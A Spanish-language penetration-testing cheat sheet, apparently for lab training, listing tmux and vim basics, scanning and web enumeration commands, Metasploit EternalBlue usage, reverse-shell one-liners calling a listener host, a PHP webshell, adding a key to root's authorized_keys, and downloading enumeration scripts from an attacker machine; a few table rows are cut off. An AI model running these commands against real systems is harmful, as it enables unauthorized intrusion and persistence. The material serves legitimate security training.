### Cheatsheet de Herramientas Básicas y Pentesting

#### **Herramientas Básicas**

|**Comando**|**Descripción**|
|---|---|
|`sudo openvpn user.ovpn`|Conectar a una VPN usando un archivo OVPN.|
|`ifconfig` o `ip a`|Mostrar la dirección IP de nuestro equipo.|
|`netstat -rn`|Mostrar las redes accesibles a través de la VPN.|
|`ssh user@10.10.10.10`|Conectar a un servidor remoto mediante SSH.|
|`ftp 10.129.42.253`|Conectar a un servidor remoto mediante FTP.|

#### **Tmux**

|**Comando**|**Descripción**|
|---|---|
|`tmux`|Iniciar una nueva sesión de tmux.|
|`ctrl+b`|Prefijo por defecto en tmux.|
|`prefix c`|Crear una nueva ventana en tmux.|
|`prefix 1`|Cambiar a la ventana número 1 en tmux.|
|`prefix shift+%`|Dividir el panel verticalmente.|
|`prefix shift+"`|Dividir el panel horizontalmente.|
|`prefix ->`|Cambiar al panel de la derecha.|

#### **Vim**

|**Comando**|**Descripción**|
|---|---|
|`vim file`|Abrir un archivo con vim.|
|`esc + i`|Entrar en modo insertar.|
|`esc`|Volver al modo normal.|
|`x`|Cortar un carácter.|
|`dw`|Cortar una palabra.|
|`dd`|Cortar una línea completa.|
|`yw`|Copiar una palabra.|
|`yy`|Copiar una línea completa.|
|`p`|Pegar.|
|`:1`|Ir a la línea número 1.|
|`:w`|Guardar el archivo.|
|`:q`|Salir de vim.|
|`:q!`|Salir sin guardar.|
|`:wq`|Guardar y salir.|

---

### **Pentesting**

#### **Escaneo de Servicios**

|**Comando**|**Descripción**|
|---|---|
|`nmap 10.129.42.253`|Escanear un IP con Nmap.|
|`nmap -sV -sC -p- 10.129.42.253`|Realizar un escaneo de Nmap con scripts en todos los puertos.|
|`locate scripts/citrix`|Listar scripts de Nmap disponibles para Citrix.|
|`nmap --script smb-os-discovery.nse -p445 10.10.10.40`|Ejecutar un script de Nmap en SMB.|
|`netcat 10.10.10.10 22`|Capturar el banner de un puerto abierto con Netcat.|
|`smbclient -N -L \\\\10.129.42.253`|Listar los recursos compartidos SMB en un servidor.|
|`smbclient \\\\10.129.42.253\\users`|Conectarse a un recurso compartido SMB.|
|`snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`|Realizar un escaneo SNMP.|
|`onesixtyone -c dict.txt 10.129.42.254`|Fuerza bruta del string secreto SNMP.|

#### **Enumeración Web**

|**Comando**|**Descripción**|
|---|---|
|`gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`|Ejecutar un escaneo de directorios en un sitio web.|
|`gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt`|Escanear subdominios en un sitio web.|
|`curl -IL https://www.inlanefreight.com`|Capturar el banner de un sitio web con `curl`.|
|`whatweb 10.10.10.121`|Obtener detalles sobre el servidor web y certificados.|
|`curl 10.10.10.121/robots.txt`|Listar posibles directorios en `robots.txt`.|
|`ctrl+U`|Ver el código fuente de una página (en Firefox).|

#### **Exploits Públicos**

|**Comando**|**Descripción**|
|---|---|
|`searchsploit openssh 7.2`|Buscar exploits públicos para una aplicación.|
|`msfconsole`|Iniciar el Metasploit Framework (MSF).|
|`search exploit eternalblue`|Buscar exploits en Metasploit.|
|`use exploit/windows/smb/ms17_010_psexec`|Utilizar un módulo de Metasploit.|
|`show options`|Mostrar las opciones necesarias para un módulo.|
|`set RHOSTS 10.10.10.40`|Configurar un valor para un módulo en Metasploit.|
|`check`|Verificar si el servidor objetivo es vulnerable.|
|`exploit`|Ejecutar el exploit en el servidor objetivo.|

#### **Uso de Shells**

|**Comando**|**Descripción**|
|---|---|
|`nc -lvnp 1234`|Iniciar un listener en un puerto local.|
|`bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`|Enviar una reverse shell desde el servidor remoto.|
|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|
|`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|
|`nc 10.10.10.1 1234`|Conectarse a una bind shell en el servidor remoto.|
|`python -c 'import pty; pty.spawn("/bin/bash")'`|Mejorar la TTY de la shell (opción 1).|
|`ctrl+z then stty raw -echo then fg then enter twice`|Mejorar la TTY de la shell (opción 2).|
|`echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`|Crear una webshell PHP.|
|`curl http://SERVER_IP:PORT/shell.php?cmd=id`|Ejecutar un comando en la webshell cargada.|

#### **Escalada de Privilegios**

|**Comando**|**Descripción**|
|---|---|
|`./linpeas.sh`|Ejecutar el script **linpeas** para enumerar información en el servidor remoto.|
|`sudo -l`|Listar privilegios sudo disponibles.|
|`sudo -u user /bin/echo Hello World!`|Ejecutar un comando con sudo como otro usuario.|
|`sudo su -`|Cambiar al usuario root (si tenemos acceso a `sudo su`).|
|`sudo su user -`|Cambiar a otro usuario (si tenemos acceso a `sudo su`).|
|`ssh-keygen -f key`|Crear una nueva clave SSH.|
|`echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`|Agregar la clave pública generada al usuario.|
|`ssh root@10.10.10.10 -i key`|Conectarse al servidor con la clave privada generada.|

#### **Transferencia de Archivos**

| **Comando**                                            | **Descripción**                                                         |
| ------------------------------------------------------ | ----------------------------------------------------------------------- |
| `python3 -m http.server 8000`                          | Iniciar un servidor web local.                                          |
| `wget http://10.10.14.1:8000/linpeas.sh`               | Descargar un archivo en el servidor remoto desde nuestra máquina.       |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Descargar un archivo usando `curl`.                                     |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`       | Transferir un archivo a un servidor remoto usando `scp` (requiere SSH). |
| `base64 shell -w 0`                                    | Convertir un archivo a base64.                                          |
| `echo f0VMR...SNIO...InmDwU                            | base64 -d > shell`                                                      |
| `md5sum shell`                                         | Verificar el **md5sum** del archivo para asegurar su integridad.        |
